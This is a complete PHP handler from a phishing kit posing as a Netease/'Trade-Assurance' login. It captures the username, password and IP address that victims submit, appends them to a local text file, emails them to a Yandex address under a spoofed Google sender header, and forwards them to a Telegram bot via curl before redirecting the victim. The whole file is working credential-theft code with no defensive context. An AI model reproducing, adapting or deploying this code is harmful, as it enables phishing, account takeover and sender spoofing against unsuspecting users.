?   <?

$botToken = "";
$id = "";

$ip = getenv("REMOTE_ADDR");
$ip = getenv("REMOTE_ADDR");
$message  = "---------------+Netease Domain+-----------------\n";
$message .= "username: ".$_POST['user']."\n";
$message .= "password: ".$_POST['pass']."\n";
$message .= "IP: ".$ip."\n";
$message .= "------------------------------------------------\n";


$file = "text.txt";
$open = fopen($file, "a");
fwrite($open, $message."\n");
fclose($open);


$send = "smart.dice@yandex.com, smart.dice@yandex.com";
$subject = "Trade-Assurance:  .$ip.";
$headers = "From:Trade-Assurance<logs@www.accounts.google.com>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
mail($send, $subject, $message); 



$mess =urlencode($message);
	$url = "https://api.telegram.org/bot".$botToken."/sendmessage?chat_id=".$id ."&text=".$mess;
	$curl = curl_init();
	// curl_setopt ($curl, CURLOPT_PORT , 8089);
	curl_setopt($curl, CURLOPT_URL, $url);
	curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
	curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
	// curl_exec($curl);
	
	$result=curl_exec($curl);
	if ($result) {
		$signal = 'ok';
		$msg = 'InValid Credentials';
	}
	curl_close($curl);


echo "<meta http-equiv='Refresh' content='0;URL=index.php' />";
	  

?>   